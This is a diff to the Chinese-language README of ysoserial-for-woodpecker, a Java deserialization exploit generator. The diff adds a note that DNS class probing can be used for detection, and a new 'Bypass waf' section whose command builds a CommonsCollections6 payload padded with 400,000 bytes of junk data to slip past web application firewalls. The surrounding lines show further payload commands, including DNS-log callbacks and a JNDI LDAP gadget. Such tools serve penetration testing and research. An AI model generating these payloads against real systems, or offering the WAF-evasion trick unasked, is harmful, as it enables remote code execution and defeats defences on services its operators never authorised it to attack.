@@ -33,6 +33,8 @@ java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsBeanutils1 -a "dnslog
 ```
 
 #### 3.3 DNS探测class
+可用于探测
+
 ```
 java -jar ysoserial-for-woodpecker-<version>.jar -g FindClassByDNS -a "http://string.dnslog.cn|java.lang.String"
 ```
@@ -78,6 +80,12 @@ java -cp ysoserial-for-woodpecker-<version>.jar me.gv7.woodpecker.yso.exploit.JR
 
 ```
 java -jar ysoserial-for-woodpecker-<version>.jar -g Spring3 -a "jndi:ldap://127.0.0.1:1089/obj"
+```
+#### 3.11 Bypass waf
+加入40w脏数据绕WAF
+
+```
+java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsCollections6 -a "raw_cmd:calc" --dirt-data-length 400000
 ```
 
 更多功能移步`0x04 更多功能命令`
